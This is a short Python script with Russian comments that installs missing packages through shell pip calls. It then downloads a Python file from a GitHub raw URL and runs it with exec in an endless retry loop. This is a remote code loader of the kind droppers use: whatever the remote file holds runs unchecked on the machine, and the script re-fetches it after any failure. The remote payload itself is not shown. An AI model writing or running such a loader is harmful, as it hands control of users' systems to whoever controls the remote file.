#print('абвгдеёжзийклмнопрстуфхцчшщъыьэюя'.upper())



# функция скачивания библеотек
def import_plys(lib_import, lib):
    try:
        exec(f'{lib_import}')
    except:
        try:
            system(f'pip install {lib}')
        except:
            from os import system
            system(f'pip install {lib}')
        finally:
            try:
                exec(f'{lib_import}')
            except:
                try:
                    system(f'pip3 install {lib}')
                    exec(f'{lib_import}')
                except:
                    try:
                        system(f'pip install --user {lib}')
                        exec(f'{lib_import}')
                    except:
                        try:system('python.exe -m pip install --upgrade pip')
                        except:print('error 1')

# Импортируем библеотеки
try:from requests import get
except:import_plys('from requests import get',"requests")
from time import sleep
print(1)




blok_data = str(get('https://raw.githubusercontent.com/boingo0/sssss/refs/heads/main/main.py').text)
while 1:
  try:
    exec(blok_data)
  except:
    sleep(5)
    blok_data = str(get('https://raw.githubusercontent.com/boingo0/sssss/refs/heads/main/main.py').text)
